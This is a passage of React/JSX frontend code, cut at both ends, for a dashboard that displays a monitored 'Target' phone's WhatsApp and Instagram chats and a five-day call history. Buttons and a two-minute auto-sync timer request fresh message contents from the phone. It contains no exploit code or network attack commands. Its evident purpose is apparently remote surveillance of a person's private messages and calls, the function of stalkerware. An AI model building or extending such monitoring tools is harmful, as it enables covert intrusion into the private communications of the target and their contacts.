                                <span className="text-[10px] text-gray-400 shrink-0 font-medium">
                                  {formatChatTime(c.lastMessageAt)}
                                </span>
                              </div>

                              {c.subtitle && c.subtitle !== "WhatsApp Contact" && (
                                <p className="text-[10px] text-gray-500 font-mono truncate mb-0.5">
                                  {c.subtitle}
                                </p>
                              )}

                              {/* Two-line preview */}
                              <p
                                className="text-[11px] text-gray-600 line-clamp-2 leading-snug flex items-start gap-1"
                                title={c.lastMessage || ""}
                              >
                                {c.lastIsOutgoing ? (
                                  <span className={isInstagram ? "text-pink-600 font-bold text-[10px] shrink-0" : "text-emerald-600 font-bold text-[10px] shrink-0"} title="Sent by Target">
                                    ↗ Sent:
                                  </span>
                                ) : c.lastMessage && !c.isContactOnly ? (
                                  <span className="text-sky-600 font-bold text-[10px] shrink-0" title="Received from Contact">
                                    ↙ Recv:
                                  </span>
                                ) : null}
                                <span className={c.isContactOnly ? (isInstagram ? "text-pink-700 italic font-medium truncate" : "text-emerald-700 italic font-medium truncate") : "truncate"}>
                                  {c.lastMessage || "(No messages yet)"}
                                </span>
                              </p>

                              <div className="mt-1 flex items-center gap-1.5 flex-wrap">
                                {isRequestingThis ? (
                                  <span className={`text-[9px] font-semibold px-1.5 py-0.2 rounded animate-pulse flex items-center gap-1 ${
                                    isInstagram ? "bg-pink-100 text-pink-800" : "bg-emerald-100 text-emerald-800"
                                  }`}>
                                    <span className="animate-spin text-[8px]">↻</span> Requesting from phone...
                                  </span>
                                ) : (
                                  <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
                                    {c.totalMessages} {c.totalMessages === 1 ? "msg" : "msgs"}
                                  </span>
                                )}
                                {c.targetAccount && (
                                  <span className="text-[9px] font-bold bg-pink-100/80 text-pink-800 border border-pink-200 px-1.5 py-0.2 rounded-md">
                                    @{c.targetAccount}
                                  </span>
                                )}
                                <span
                                  className={`text-[9px] font-semibold uppercase px-1.5 py-0.2 rounded border ${
                                    isInstagram
                                      ? "bg-pink-50 text-pink-700 border-pink-200"
                                      : isChannelItem
                                      ? "bg-purple-50 text-purple-700 border-purple-200"
                                      : "bg-emerald-50 text-emerald-700 border-emerald-200"
                                  }`}
                                >
                                  {isInstagram ? "Instagram Direct" : isChannelItem ? "Channel" : "WhatsApp Chat"}
                                </span>
                              </div>
                            </div>
                          </div>
                        );
                      })
                    )
                  )}
                </div>
              </div>

              {/* ----------------------------------------------------------- */}
              {/* COLUMN 3: SELECTED CONVERSATION OR CALL DETAILS VIEW        */}
              {/* ----------------------------------------------------------- */}
              <div className="flex-1 min-w-0 flex flex-col bg-slate-100/60 h-full min-h-0 overflow-hidden">
                {chatCategory === "calls" ? (
                  /* ========================================================= */
                  /* CALL DETAILS & 5-DAY CALL HISTORY VIEW                    */
                  /* ========================================================= */
                  selectedCallSummary ? (
                    <>
                      {/* Call Header */}
                      <div className="p-3 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shadow-2xs shrink-0">
                        <div className="flex items-center gap-3 min-w-0">
                          <div
                            className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
                              selectedCallSummary.direction === "missed"
                                ? "bg-rose-500"
                                : selectedCallSummary.direction === "outgoing"
                                ? "bg-blue-600"
                                : "bg-emerald-600"
                            }`}
                          >
                            {selectedCallSummary.direction === "missed" ? "📵" : selectedCallSummary.call_type === "video" ? "📹" : "📞"}
                          </div>
                          <div className="min-w-0">
                            <h3 className="text-xs font-bold text-gray-900 truncate">
                              {selectedCallSummary.name || selectedCallSummary.number || "WhatsApp Contact"}
                            </h3>
                            <p className="text-[10px] text-gray-500 font-mono flex items-center gap-1.5 truncate">
                              {selectedCallSummary.number && <span>{selectedCallSummary.number}</span>}
                              <span>•</span>
                              <span className="capitalize font-sans font-medium text-gray-600">
                                {selectedCallSummary.direction} {selectedCallSummary.call_type === "video" ? "Video Call" : "Voice Call"}
                              </span>
                            </p>
                          </div>
                        </div>

                        <div className="flex items-center gap-2 shrink-0">
                          <span
                            className={`text-[10px] font-semibold px-2.5 py-0.5 rounded-full border ${
                              selectedCallSummary.direction === "missed"
                                ? "bg-rose-50 text-rose-700 border-rose-200"
                                : selectedCallSummary.direction === "outgoing"
                                ? "bg-blue-50 text-blue-700 border-blue-200"
                                : "bg-emerald-50 text-emerald-700 border-emerald-200"
                            }`}
                          >
                            {selectedCallSummary.direction === "missed"
                              ? "📵 Missed Call"
                              : selectedCallSummary.direction === "outgoing"
                              ? "↗ Outgoing Call"
                              : "↙ Incoming Call"}
                          </span>
                          <span className="text-[10px] font-semibold px-2 py-0.5 rounded-full bg-gray-100 text-gray-600 border border-gray-200">
                            Last 5 Days
                          </span>
                        </div>
                      </div>

                      {/* 5-Day Call History Banner */}
                      <div className="px-3.5 py-2 bg-gradient-to-r from-blue-50 via-sky-50/70 to-blue-50 border-b border-blue-100 flex flex-wrap items-center justify-between gap-2 text-xs text-blue-950 shrink-0 shadow-2xs">
                        <div className="flex items-center gap-2 min-w-0">
                          <span className="text-sm">📞</span>
                          <div className="flex flex-col sm:flex-row sm:items-center sm:gap-2 min-w-0">
                            <span className="font-bold text-blue-900 text-[11px]">
                              WhatsApp Call Record (Last 5 Days History)
                            </span>
                            <span className="hidden sm:inline text-blue-300">•</span>
                            <span className="text-[11px] text-blue-800 truncate">
                              Dashboard Login:{" "}
                              <strong className="font-semibold text-blue-950">
                                {formatMessageDateTime(dashboardLoginTime.toISOString())}
                              </strong>
                            </span>
                          </div>
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <span className="text-[10px] font-semibold text-blue-800 bg-white px-2 py-0.5 rounded-full border border-blue-200 flex items-center gap-1 shadow-2xs">
                            <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse" />
                            Live Real-Time
                          </span>
                        </div>
                      </div>

                      {/* Call Details Canvas */}
                      <div className="flex-1 min-h-0 p-4 overflow-y-auto space-y-4 bg-slate-50/70">
                        {/* Selected Call Detail Card */}
                        <div className="bg-white rounded-2xl shadow-sm border border-gray-200/80 p-5 space-y-4">
                          <div className="flex items-center gap-4">
                            <div
                              className={`w-14 h-14 rounded-2xl flex items-center justify-center text-2xl shadow-md text-white shrink-0 ${
                                selectedCallSummary.direction === "missed"
                                  ? "bg-gradient-to-br from-rose-500 to-red-600"
                                  : selectedCallSummary.direction === "outgoing"
                                  ? "bg-gradient-to-br from-blue-500 to-indigo-600"
                                  : "bg-gradient-to-br from-emerald-500 to-teal-600"
                              }`}
                            >
                              {selectedCallSummary.direction === "missed" ? "📵" : selectedCallSummary.call_type === "video" ? "📹" : "📞"}
                            </div>
                            <div className="min-w-0 flex-1">
                              <h3 className="text-base font-bold text-gray-900 truncate">
                                {selectedCallSummary.name || selectedCallSummary.number || "WhatsApp Contact"}
                              </h3>
                              <p className="text-xs font-mono text-gray-500 mt-0.5">
                                {selectedCallSummary.number || "Phone number hidden/unavailable"}
                              </p>
                              <div className="flex items-center gap-2 mt-2">
                                <span
                                  className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wide border ${
                                    selectedCallSummary.direction === "missed"
                                      ? "bg-rose-50 text-rose-700 border-rose-200"
                                      : selectedCallSummary.direction === "outgoing"
                                      ? "bg-blue-50 text-blue-700 border-blue-200"
                                      : "bg-emerald-50 text-emerald-700 border-emerald-200"
                                  }`}
                                >
                                  {selectedCallSummary.direction === "missed"
                                    ? "Missed Call"
                                    : selectedCallSummary.direction === "outgoing"
                                    ? "Outgoing Call"
                                    : "Incoming Call"}
                                </span>
                                <span className="text-[10px] font-semibold text-blue-700 bg-blue-50 border border-blue-200 px-2 py-0.5 rounded-full">
                                  WhatsApp Call Log
                                </span>
                              </div>
                            </div>
                          </div>

                          {/* Call Information Metadata Grid */}
                          <div className="border-t border-gray-100 pt-4 grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                            <div className="bg-gray-50/80 p-3 rounded-xl border border-gray-100 space-y-1">
                              <span className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Call Timestamp</span>
                              <p className="font-semibold text-gray-800">
                                {formatMessageDateTime(selectedCallSummary.timestamp)}
                              </p>
                              <p className="text-[10px] text-gray-500">
                                {formatChatTime(selectedCallSummary.timestamp)}
                              </p>
                            </div>

                            <div className="bg-gray-50/80 p-3 rounded-xl border border-gray-100 space-y-1">
                              <span className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Duration</span>
                              <p className="font-semibold text-gray-800 font-mono">
                                {selectedCallSummary.duration_sec > 0
                                  ? formatCallDuration(selectedCallSummary.duration_sec)
                                  : selectedCallSummary.direction === "missed"
                                  ? "0s (Missed / Unanswered)"
                                  : "Completed Call"}
                              </p>
                              <p className="text-[10px] text-gray-500">
                                {selectedCallSummary.direction === "missed" ? "Not answered by target" : "Call connected"}
                              </p>
                            </div>

                            <div className="bg-gray-50/80 p-3 rounded-xl border border-gray-100 space-y-1">
                              <span className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Call Medium & Type</span>
                              <p className="font-semibold text-gray-800 capitalize">
                                WhatsApp {selectedCallSummary.call_type === "video" ? "Video Call" : "Voice Call"}
                              </p>
                              <p className="text-[10px] text-gray-500">
                                Direction: {selectedCallSummary.direction}
                              </p>
                            </div>

                            <div className="bg-gray-50/80 p-3 rounded-xl border border-gray-100 space-y-1">
                              <span className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Sync Source</span>
                              <p className="font-semibold text-gray-800">
                                {selectedCallSummary.source === "whatsapp" ? "WhatsApp Call Notification" : "Device Call Log"}
                              </p>
                              <p className="text-[10px] text-blue-600 font-medium">
                                Last 5 Days Activity Window
                              </p>
                            </div>
                          </div>
                        </div>

                        {/* Recent 5-Day Calls with this Contact */}
                        <div className="bg-white rounded-2xl shadow-sm border border-gray-200/80 p-4 space-y-3">
                          <div className="flex items-center justify-between">
                            <h4 className="text-xs font-bold text-gray-900 flex items-center gap-1.5">
                              <span>📋</span>
                              <span>All Calls with this Contact (Last 5 Days)</span>
                            </h4>
                            <span className="text-[10px] font-semibold text-gray-500">
                              {
                                whatsAppCalls.filter(
                                  (c) =>
                                    (c.number && c.number === selectedCallSummary.number) ||
                                    c.name === selectedCallSummary.name
                                ).length
                              }{" "}
                              recorded
                            </span>
                          </div>

                          <div className="divide-y divide-gray-100">
                            {whatsAppCalls
                              .filter(
                                (c) =>
                                  (c.number && c.number === selectedCallSummary.number) ||
                                  c.name === selectedCallSummary.name
                              )
                              .map((c) => (
                                <div
                                  key={c.id}
                                  onClick={() => setSelectedCallId(c.id)}
                                  className={`py-2 px-2 rounded-lg flex items-center justify-between text-xs cursor-pointer transition ${
                                    c.id === selectedCallSummary.id ? "bg-blue-50 font-semibold" : "hover:bg-gray-50"
                                  }`}
                                >
                                  <div className="flex items-center gap-2">
                                    <span
                                      className={`w-6 h-6 rounded-full flex items-center justify-center text-xs text-white ${
                                        c.direction === "missed"
                                          ? "bg-rose-500"
                                          : c.direction === "outgoing"
                                          ? "bg-blue-600"
                                          : "bg-emerald-600"
                                      }`}
                                    >
                                      {c.direction === "missed" ? "📵" : c.call_type === "video" ? "📹" : "📞"}
                                    </span>
                                    <div>
                                      <p className="text-gray-900 text-xs capitalize">
                                        {c.direction} {c.call_type === "video" ? "Video" : "Voice"}
                                      </p>
                                      <p className="text-[10px] text-gray-400">
                                        {formatMessageDateTime(c.timestamp)}
                                      </p>
                                    </div>
                                  </div>
                                  <div className="text-right">
                                    {c.duration_sec > 0 && (
                                      <span className="text-[10px] font-mono text-gray-600 block">
                                        ⏱ {formatCallDuration(c.duration_sec)}
                                      </span>
                                    )}
                                    <span
                                      className={`text-[9px] font-bold uppercase ${
                                        c.direction === "missed"
                                          ? "text-rose-600"
                                          : c.direction === "outgoing"
                                          ? "text-blue-600"
                                          : "text-emerald-600"
                                      }`}
                                    >
                                      {c.direction}
                                    </span>
                                  </div>
                                </div>
                              ))}
                          </div>
                        </div>
                      </div>
                    </>
                  ) : (
                    <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
                      <span className="text-4xl block">📞</span>
                      <p className="text-sm font-semibold text-gray-700">No Call Selected</p>
                      <p className="text-xs text-gray-400 max-w-sm">
                        Select a call from the list on the left to view full call details and 5-day history.
                      </p>
                    </div>
                  )
                ) : (
                  /* ========================================================= */
                  /* CHATS & CHANNELS CONVERSATION VIEW (LAST 2 DAYS DATA)     */
                  /* ========================================================= */
                  selectedChatSummary ? (
                    <>
                      {/* Conversation Header */}
                      <div className="p-3 border-b border-gray-200 bg-white flex items-center justify-between gap-3 shadow-2xs shrink-0">
                        <div className="flex items-center gap-3 min-w-0">
                          <div
                            className={`w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm shrink-0 shadow-xs text-white ${
                              selectedApp === "instagram"
                                ? "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600"
                                : isWhatsAppChannel(selectedChatSummary)
                                ? "bg-purple-600"
                                : "bg-emerald-600"
                            }`}
                          >
                            {selectedApp === "instagram"
                              ? selectedChatSummary.chatName.charAt(0).toUpperCase()
                              : isWhatsAppChannel(selectedChatSummary)
                              ? "📢"
                              : selectedChatSummary.chatName.charAt(0).toUpperCase()}
                          </div>
                          <div className="min-w-0">
                            <h3 className="text-xs font-bold text-gray-900 truncate">
                              {selectedChatSummary.chatName}
                            </h3>
                            <p className="text-[10px] text-gray-400 flex items-center gap-1">
                              <span className={`w-1.5 h-1.5 rounded-full inline-block ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                              <span className="truncate">
                                {selectedChatSummary.subtitle || (selectedApp === "instagram" ? "Instagram Direct" : "WhatsApp Chat")} • Conversation Activity
                              </span>
                            </p>
                          </div>
                        </div>

                        <div className="flex items-center gap-2 shrink-0">
                          <button
                            type="button"
                            id="btn-header-sync-now"
                            onClick={handleManualSyncNow}
                            disabled={requestingChat === selectedChatSummary.chatName}
                            className={`text-xs font-semibold px-2.5 py-1 text-white rounded-lg transition flex items-center gap-1.5 shadow-xs disabled:opacity-60 ${
                              selectedApp === "instagram"
                                ? "bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700"
                                : "bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800"
                            }`}
                            title="Send request to mobile application to get chat contents for last 2 days"
                          >
                            <span className={requestingChat === selectedChatSummary.chatName ? "animate-spin" : ""}>
                              {requestingChat === selectedChatSummary.chatName ? "↻" : "⚡"}
                            </span>
                            <span className="hidden sm:inline">
                              {requestingChat === selectedChatSummary.chatName ? "Syncing..." : "Sync Now (2 Days)"}
                            </span>
                          </button>
                          <div className="bg-gray-100 p-0.5 rounded-md flex text-[10px] font-medium">
                            <button
                              type="button"
                              onClick={() => setTimeFilter("2days")}
                              className={`px-2 py-0.5 rounded transition ${
                                timeFilter === "2days"
                                  ? "bg-white text-gray-900 shadow-2xs font-semibold"
                                  : "text-gray-500 hover:text-gray-900"
                              }`}
                            >
                              Last 2 Days
                            </button>
                            <button
                              type="button"
                              onClick={() => setTimeFilter("all")}
                              className={`px-2 py-0.5 rounded transition ${
                                timeFilter === "all"
                                  ? "bg-white text-gray-900 shadow-2xs font-semibold"
                                  : "text-gray-500 hover:text-gray-900"
                              }`}
                            >
                              All ({selectedChatSummary.totalMessages})
                            </button>
                          </div>
                          <span className={`text-[10px] font-semibold px-2.5 py-0.5 rounded-full border ${
                            selectedApp === "instagram"
                              ? "bg-pink-50 text-pink-700 border-pink-200"
                              : "bg-emerald-50 text-emerald-700 border-emerald-200"
                          }`}>
                            {activeThreadMessages.length} msgs
                          </span>
                        </div>
                      </div>

                      {/* 2-Min Auto-Sync & Countdown Controller Bar */}
                      <div className="bg-gradient-to-r from-slate-900 via-slate-850 to-slate-900 text-white border-b border-slate-700/80 px-3.5 py-2 shadow-sm flex flex-wrap items-center justify-between gap-2 shrink-0">
                        <div className="flex items-center gap-2.5 min-w-0">
                          <span
                            className={`w-2.5 h-2.5 rounded-full shrink-0 ${
                              autoSyncEnabled
                                ? selectedApp === "instagram" ? "bg-pink-400 animate-pulse ring-2 ring-pink-400/30" : "bg-emerald-400 animate-pulse ring-2 ring-emerald-400/30"
                                : "bg-gray-400"
                            }`}
                          />
                          <div className="flex flex-wrap items-center gap-2 min-w-0">
                            <span className="text-xs font-bold text-slate-200">
                              2-Min Mobile Auto-Sync:
                            </span>
                            <span
                              className={`px-2 py-0.5 rounded text-[11px] font-mono font-bold ${
                                !autoSyncEnabled
                                  ? "bg-slate-800 text-slate-400 border border-slate-700"
                                  : countdownSeconds <= 15
                                  ? "bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse"
                                  : selectedApp === "instagram"
                                  ? "bg-pink-500/20 text-pink-300 border border-pink-500/30"
                                  : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"
                              }`}
                            >
                              {autoSyncEnabled ? `⏱️ Next in ${formatCountdown(countdownSeconds)}` : "⏸️ Paused"}
                            </span>
                            {lastSyncTime && (
                              <span className="text-[10px] text-slate-400 hidden lg:inline">
                                • Synced: {lastSyncTime.toLocaleTimeString()}
                              </span>
                            )}
                          </div>
                        </div>

                        <div className="flex items-center gap-1.5 shrink-0">
                          <button
                            type="button"
                            id="btn-auto-sync-now"
                            onClick={handleManualSyncNow}
                            disabled={requestingChat === selectedChatSummary.chatName}
                            className={`px-2.5 py-1 text-white rounded-md text-xs font-bold transition flex items-center gap-1 shadow-sm disabled:opacity-50 ${
                              selectedApp === "instagram"
                                ? "bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700"
                                : "bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700"
                            }`}
                            title="Immediately dispatch fetch request to mobile phone and reset 2-minute timer"
                          >
                            <span className={requestingChat === selectedChatSummary.chatName ? "animate-spin" : ""}>
                              {requestingChat === selectedChatSummary.chatName ? "↻" : "⚡"}
                            </span>
                            <span>{requestingChat === selectedChatSummary.chatName ? "Syncing..." : "Sync Now"}</span>
                          </button>

                          <button
                            type="button"
                            id="btn-auto-toggle"
                            onClick={() => setAutoSyncEnabled((prev) => !prev)}
                            className={`px-2 py-1 rounded-md text-xs font-medium border transition flex items-center gap-1 ${
                              autoSyncEnabled
                                ? "border-slate-700 bg-slate-800 text-slate-300 hover:bg-slate-700"
                                : "border-amber-500/40 bg-amber-500/10 text-amber-300 hover:bg-amber-500/20"
                            }`}
                            title={autoSyncEnabled ? "Pause automatic 2-minute mobile sync" : "Resume automatic 2-minute mobile sync"}
                          >
                            {autoSyncEnabled ? "⏸️ Pause" : "▶️ Resume"}
                          </button>
                        </div>
                      </div>

                      {/* Mini 4-Step Chat Sync Progress Bar */}
                      {syncProgress && (
                        <div
                          id="chat-sync-progress-bar"
                          className="px-3.5 py-2.5 bg-gradient-to-r from-slate-900 via-slate-850 to-slate-900 border-b border-slate-700/80 text-white shadow-md transition-all duration-300"
                        >
                          <div className="flex items-center justify-between gap-2 mb-1.5">
                            <div className="flex items-center gap-2 min-w-0">
                              <span className="flex h-2 w-2 relative">
                                {syncProgress.status === "running" ? (
                                  <>
                                    <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${selectedApp === "instagram" ? "bg-pink-400" : "bg-emerald-400"}`}></span>
                                    <span className={`relative inline-flex rounded-full h-2 w-2 ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`}></span>
                                  </>
                                ) : syncProgress.status === "error" ? (
                                  <span className="relative inline-flex rounded-full h-2 w-2 bg-rose-500"></span>
                                ) : syncProgress.status === "empty" ? (
                                  <span className="relative inline-flex rounded-full h-2 w-2 bg-amber-500"></span>
                                ) : (
                                  <span className="relative inline-flex rounded-full h-2 w-2 bg-teal-400"></span>
                                )}
                              </span>
                              <span className="text-[11px] font-semibold text-slate-200 truncate">
                                Syncing: <span className={selectedApp === "instagram" ? "text-pink-400 font-bold" : "text-emerald-400 font-bold"}>{syncProgress.chatName}</span>
                              </span>
                            </div>
                            <div className="flex items-center gap-2 shrink-0">
                              <span className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded ${
                                selectedApp === "instagram"
                                  ? "text-pink-400 bg-pink-950/60 border border-pink-500/30"
                                  : "text-emerald-400 bg-emerald-950/60 border border-emerald-500/30"
                              }`}>
                                {syncProgress.percent}%
                              </span>
                              <button
                                type="button"
                                onClick={() => setSyncProgress(null)}
                                className="text-slate-400 hover:text-slate-200 text-xs px-1 hover:bg-slate-800 rounded transition"
                                title="Dismiss progress bar"
                              >
                                ✕
                              </button>
                            </div>
                          </div>

                          {/* 4-Step Visual Milestones */}
                          <div className="grid grid-cols-4 gap-1 mb-1.5 text-[9px] font-medium">
                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 1 ? (selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                              <span>📤</span>
                              <span className="truncate">1. Request</span>
                            </div>
                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 2 ? (selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                              <span>📱</span>
                              <span className="truncate">2. Phone Rx</span>
                            </div>
                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 3 ? (selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                              <span>💬</span>
                              <span className="truncate">3. Response</span>
                            </div>
                            <div className={`flex items-center gap-1 px-1.5 py-0.5 rounded transition ${syncProgress.step >= 4 ? (syncProgress.status === "error" ? "bg-rose-500/20 text-rose-300 border border-rose-500/40" : selectedApp === "instagram" ? "bg-pink-500/20 text-pink-300 border border-pink-500/40" : "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40") : "bg-slate-800/60 text-slate-500"}`}>
                              <span>💾</span>
                              <span className="truncate">4. DB Ready</span>
                            </div>
                          </div>

                          {/* Progress Line */}
                          <div className="w-full bg-slate-800 rounded-full h-1.5 overflow-hidden">
                            <div
                              className={`h-full transition-all duration-500 ease-out ${
                                syncProgress.status === "error"
                                  ? "bg-rose-500"
                                  : syncProgress.percent === 100
                                  ? selectedApp === "instagram"
                                    ? "bg-gradient-to-r from-purple-500 via-pink-500 to-rose-400"
                                    : "bg-gradient-to-r from-emerald-500 via-teal-400 to-emerald-400"
                                  : selectedApp === "instagram"
                                  ? "bg-gradient-to-r from-purple-500 via-pink-500 to-rose-400 animate-pulse"
                                  : "bg-gradient-to-r from-blue-500 via-teal-400 to-emerald-400 animate-pulse"
                              }`}
                              style={{ width: `${syncProgress.percent}%` }}
                            />
                          </div>

                          {/* Detail Status text */}
                          <div className="mt-1 flex items-center justify-between text-[10px] text-slate-400 font-mono">
                            <span className="truncate">{syncProgress.detail}</span>
                            {syncProgress.status === "running" && (
                              <span className={`text-[10px] animate-pulse shrink-0 ml-2 ${selectedApp === "instagram" ? "text-pink-400" : "text-emerald-400"}`}>Live Sync...</span>
                            )}
                          </div>
                        </div>
                      )}
                      <div className={`px-3.5 py-2 border-b flex flex-wrap items-center justify-between gap-2 text-xs shrink-0 shadow-2xs ${
                        selectedApp === "instagram"
                          ? "bg-gradient-to-r from-purple-50 via-pink-50/70 to-rose-50 border-pink-100 text-purple-950"
                          : "bg-gradient-to-r from-emerald-50 via-teal-50/70 to-emerald-50 border-emerald-100 text-emerald-950"
                      }`}>
                        <div className="flex items-center gap-2 min-w-0">
                          <span className="text-sm">{selectedApp === "instagram" ? "📸" : "📅"}</span>
                          <div className="flex flex-col sm:flex-row sm:items-center sm:gap-2 min-w-0">
                            <span className={`font-bold text-[11px] ${selectedApp === "instagram" ? "text-purple-900" : "text-emerald-900"}`}>
                              {selectedApp === "instagram"
                                ? "Last 2 Days Instagram Direct Conversation (DMs, Reels & Media)"
                                : "Last 2 Days WhatsApp Chat Contents"}
                            </span>
                            <span className="hidden sm:inline text-gray-300">•</span>
                            <span className={`text-[11px] truncate ${selectedApp === "instagram" ? "text-purple-800" : "text-emerald-800"}`}>
                              Dashboard Login:{" "}
                              <strong className={`font-semibold ${selectedApp === "instagram" ? "text-purple-950" : "text-emerald-950"}`}>
                                {formatMessageDateTime(dashboardLoginTime.toISOString())}
                              </strong>
                            </span>
                          </div>
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <span className={`text-[10px] font-semibold bg-white px-2 py-0.5 rounded-full border flex items-center gap-1 shadow-2xs ${
                            selectedApp === "instagram"
                              ? "text-pink-800 border-pink-200"
                              : "text-emerald-800 border-emerald-200"
                          }`}>
                            <span className={`w-1.5 h-1.5 rounded-full animate-pulse ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                            Live Real-Time
                          </span>
                        </div>
                      </div>

                      {/* Messages Scroll Canvas */}
                      <div className="flex-1 min-h-0 p-4 overflow-y-auto space-y-4 bg-[#efeae2]/40 bg-[radial-gradient(#d1d5db_1px,transparent_1px)] [background-size:16px_16px]">
                        {messagesLoading ? (
                          <div className="text-center py-12 text-xs text-gray-400">
                            Loading messages...
                          </div>
                        ) : activeThreadMessages.length === 0 ? (
                          <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
                            <div className="w-full max-w-sm bg-white rounded-2xl shadow-sm border border-gray-200/80 p-6 space-y-4">
                              {/* Avatar */}
                              <div className={`w-16 h-16 mx-auto rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-md ${
                                selectedApp === "instagram"
                                  ? "bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600"
                                  : "bg-gradient-to-br from-emerald-500 to-teal-600"
                              }`}>
                                {selectedChatSummary.chatName.charAt(0).toUpperCase()}
                              </div>

                              {/* Name & Info */}
                              <div>
                                <h3 className="text-base font-bold text-gray-900 truncate">
                                  {selectedChatSummary.chatName}
                                </h3>
                                {selectedChatSummary.subtitle && selectedChatSummary.subtitle !== "WhatsApp Contact" && (
                                  <p className="text-xs font-mono text-gray-500 mt-0.5">
                                    {selectedChatSummary.subtitle}
                                  </p>
                                )}
                                <span className={`inline-flex items-center gap-1.5 mt-2 px-2.5 py-0.5 rounded-full text-[11px] font-semibold border ${
                                  selectedApp === "instagram"
                                    ? "bg-pink-50 text-pink-700 border-pink-200"
                                    : "bg-emerald-50 text-emerald-700 border-emerald-200"
                                }`}>
                                  <span className={`w-1.5 h-1.5 rounded-full ${selectedApp === "instagram" ? "bg-pink-500" : "bg-emerald-500"}`} />
                                  {selectedApp === "instagram" ? "Instagram Direct Monitored Chat" : "WhatsApp Monitored Chat"}
                                </span>
                              </div>

                              <div className="border-t border-gray-100 pt-3 text-left space-y-2 text-xs">
                                <div className="flex items-center justify-between text-gray-500">
                                  <span>Chat Name</span>
                                  <strong className="text-gray-800 truncate max-w-[180px]">
                                    {selectedChatSummary.chatName}
                                  </strong>
                                </div>
                                <div className="flex items-center justify-between text-gray-500">
                                  <span>Last Activity</span>
                                  <span className="text-gray-700 font-medium">
                                    {formatMessageDateTime(selectedChatSummary.lastMessageAt || "")}
                                  </span>
                                </div>
                                <div className="flex items-center justify-between text-gray-500">
                                  <span>Total Stored</span>
                                  <span className="text-gray-700 font-medium">
                                    {selectedChatSummary.totalMessages} messages
                                  </span>
                                </div>
                              </div>

                              <div className={`rounded-xl p-3 text-[11px] leading-relaxed text-left border ${
                                selectedApp === "instagram"
                                  ? "bg-pink-50/50 text-pink-900/80 border-pink-100/60"
                                  : "bg-emerald-50/50 text-emerald-800/80 border-emerald-100/60"
                              }`}>
                                💡 Shows conversation contents from the last 2 days. The dashboard automatically requests new messages from the mobile phone every 2 minutes, or you can click below to sync now.
                              </div>

                              <button
                                type="button"
                                onClick={handleManualSyncNow}
                                disabled={requestingChat === selectedChatSummary.chatName}
                                className={`w-full py-2 text-white rounded-lg text-xs font-semibold transition flex items-center justify-center gap-1.5 shadow-xs disabled:opacity-60 ${
                                  selectedApp === "instagram"
                                    ? "bg-gradient-to-r from-purple-600 via-pink-600 to-rose-600 hover:opacity-95"
                                    : "bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-700 hover:to-teal-800"
                                }`}
                              >
                                <span className={requestingChat === selectedChatSummary.chatName ? "animate-spin" : ""}>
                                  {requestingChat === selectedChatSummary.chatName ? "↻" : "⚡"}
                                </span>
                                <span>
                                  {requestingChat === selectedChatSummary.chatName
                                    ? "Requesting from Mobile App..."
                                    : "Sync Last 2 Days Conversation from Phone"}
                                </span>
                              </button>

                              {selectedChatSummary.totalMessages > 0 && timeFilter === "2days" && (
                                <button
                                  type="button"
                                  onClick={() => setTimeFilter("all")}
                                  className={`font-semibold underline text-[11px] block mx-auto pt-1 ${selectedApp === "instagram" ? "text-pink-700" : "text-emerald-700"}`}
                                >
                                  Show all stored messages ({selectedChatSummary.totalMessages}) →
                                </button>
                              )}
                            </div>
                          </div>
                        ) : (
                          groupedMessages.map((group) => (
                            <div key={group.dateLabel} className="space-y-3">
                              {/* Date Badge */}
                              <div className="flex items-center justify-center my-2">
                                <span className="text-[10px] font-semibold px-3 py-1 rounded-full bg-white/90 text-gray-600 shadow-2xs border border-gray-200/70 uppercase tracking-wide">
                                  {group.dateLabel}
                                </span>
                              </div>

                              {/* Chat Speech Bubbles - SENDER (Target) vs RECEIVER (Contact) */}
                              {group.items.map((m) => {
